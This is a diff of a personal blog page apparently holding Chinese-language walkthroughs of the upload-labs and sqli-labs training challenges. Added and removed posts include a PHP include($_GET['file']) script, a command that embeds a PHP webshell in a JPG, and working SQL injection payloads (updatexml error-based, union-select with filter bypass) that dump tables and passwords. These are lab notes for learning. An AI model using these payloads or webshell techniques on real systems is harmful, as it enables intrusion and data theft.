@@ -71,6 +71,109 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-32" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/03/01/page-32/" class="article-date">
+  <time class="dt-published" datetime="2021-03-01T10:14:42.000Z" itemprop="datePublished">2021-03-01</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/03/01/page-32/">uplolalabs&#39;13 14 15</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p><strong>第十三关   需要上传一个图片马</strong> 但是呢要图片马可以使用必须得服务器先能解析图片马 </p>
+<p>那么就得先上传一个简单的漏洞aaa.php    这个是漏洞代码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>这个代码的意思是需要引用其他的应用程序然后它也不管是什么全当成php来解析</p>
+<p>然后需要往一个jpg里面嵌入后门代码 放图片和代码的位置cmd</p>
+<p>copy 1.jpg/b + 1.php/a 2.jpg 合并后会生成一个2.jpg 或者也可以直接嵌入1.jpg 这个/b 指定以二进制格式复制 /a指定以ASCII格式复制 图片不能用ascii复制不然到时候生成的图片打不开</p>
+<p>然后上传上去会被改名字burp可以看见被改后的名字 和储存的路径<img src="https://img.kanzhun.com/images/seo/mianshiti/20191125/160089f90c50a936fb1cb0694380bce5.jpg" alt="在这里插入图片描述"></p>
+<p>然后就是用菜刀连接一下了 </p>
+<p><a target="_blank" rel="noopener" href="http://127.0.0.1/upload-labs/aaa.php?file=upload/4320181108192653.png">http://127.0.0.1/upload-labs/aaa.php?file=upload/4320181108192653.png</a> 就还挺快的除了需要解析这一步</p>
+<p><strong>十四关</strong> 和十三差不多只是检测不一样 十三检测开头两个字节就是图片以记事本打开后的前三行可以只保留前三行然后其余全部删掉换成后门文件 </p>
+<p>十四没法这么干好像 这个是getimagesize检查那就只能用那个cmd的嵌入法 其余和十三一样了</p>
+<p><strong>十五</strong>  和前面差不多换成exif_imagetype的检查函数</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/03/01/page-32/" data-id="cksyl7wjc000vw4w7fnblgyo3" data-title="uplolalabs&#39;13 14 15" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-page-30" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/02/18/page-30/" class="article-date">
+  <time class="dt-published" datetime="2021-02-18T09:50:50.000Z" itemprop="datePublished">2021-02-18</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/02/18/page-30/">sqlilabs 50 51 52 53 54 55 56 57 58-65</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>50 51 这两关是堆叠注入没什么差别好像除了51有个单引号</p>
+<p>52 53 又关闭了报错 然后堆叠也可以弄一弄 用sqlmap 直接解决</p>
+<p>54 单引号 55括号 56 ‘) 57”  54-57这几关有次数限制 然后和之前用union select 的一样就获取数据的</p>
+<p>要获取的是secret_（后面这串是随机的） 这个列里头的数据 获取玩提交一下就可以了</p>
+<p>58 先随便试一试 存在报错信息  而且union select的没有回显只好用报错了</p>
+<p>?id=0’ and updatexml(1,(select concat(1,(select table_name from information_schema.tables where table_schema=’challenges))),1) –+   查表</p>
+<p>?id=0’ and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=’mz8xr9yz2a’),0x7e),1)–+ 查列</p>
+<p>?id=0’ and updatexml(1,concat(0x7e,(select secret_VP4R from challenges.mz8xr9yz2a),0x7e),1) –+ 查到数据提交就ok了</p>
+<p>59数字型?id=0 其余同上一关</p>
+<p>60 ?id=0”) 61 ?id=0’)) </p>
+<p>62关了报错 但是存在明显延迟时间盲注 那就用sqlmap吧  62手动注入’)</p>
+<p>63 手动注入的话单引号闭合</p>
+<p>64 俩括号 </p>
+<p>65双引号加个括号 这几关都是时间盲注 用sqlmap吧 </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/02/18/page-30/" data-id="cksyl7wjc000uw4w72zfn7omk" data-title="sqlilabs 50 51 52 53 54 55 56 57 58-65" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-29" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/02/18/page-29/" class="article-date">
@@ -456,98 +559,6 @@
 
 
   
-    <article id="post-page-19" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/02/01/page-19/" class="article-date">
-  <time class="dt-published" datetime="2021-02-01T08:13:49.000Z" itemprop="datePublished">2021-02-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/02/01/page-19/">sqlilabs 25 25a</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>a 这关过滤了or 和and 如果末尾的闭合要用and‘1’=‘1 就需要吧and双写 anandd </p>
-<p>或者直接用–+也行</p>
-<p>order 的or也会被过滤 那么就写成oorrder </p>
-<p>?id=-1’ oorrder by 3 –+ 测显位</p>
-<p>?id=-1’ union select 1,2,database() –+ 爆数据库</p>
-<p>?id=-1’ union select 1,2,group_concat(table_name) from infoorrmation_schema.tables where table_schema=’security’ –+这边information的or也要双写 爆表名</p>
-<p>?id=-1’ union select 1,2,group_concat(column_name) from infoorrmation_schema.columns where table_name=’users’ –+  爆字段</p>
-<p>?id=-1’ union select 1,2,group_concat(username,0x7e,passwoorrd) from users –+ 爆数据</p>
-<p>0x7e 是显示~这个符号用的 也可以不打进去</p>
-<p>25a和25差不多就没有了单引号 </p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/01/page-19/" data-id="cksyl7wj7000kw4w72fho2jb4" data-title="sqlilabs 25 25a" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-17" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/02/01/page-17/" class="article-date">
-  <time class="dt-published" datetime="2021-02-01T07:53:05.000Z" itemprop="datePublished">2021-02-01</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/02/01/page-17/">sqli-labs less 24</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>a这关就<img src="https://img-blog.csdnimg.cn/20200713184411840.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkwMTAzOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>给了个这样的界面 从创建新用户那点进去然后新建一个username为admin’# 密码随便 </p>
-<p>记住就行待会</p>
-<p><img src="https://img-blog.csdnimg.cn/20200713184953444.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80MzkwMTAzOA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
-<p>用admin’#登录 </p>
-<p>然后修改密码 就会发现改的其实是admin的密码 而不是admin’#的 就很神奇</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/02/01/page-17/" data-id="cksyl7wj6000iw4w73hcoc4fn" data-title="sqli-labs less 24" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -571,7 +582,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/09/">September 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/08/">August 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/06/">June 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">May 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/04/">April 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">March 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/02/">February 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">January 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/10/">October 2020</a></li></ul>
     </div>
   </div>
 
@@ -584,6 +595,14 @@
       <ul>
         
           <li>
+            <a href="/2021/09/09/page-115/">又是misc</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/09/page-114/">page</a>
+          </li>
+        
+          <li>
             <a href="/2021/08/13/page-110/">一大堆的misc 很大一堆</a>
           </li>
         
@@ -593,14 +612,6 @@
         
           <li>
             <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-107/">SUCTF 2019EasyWeb</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-106/">WUSTCTF2020CV Maker</a>
           </li>
         
       </ul>
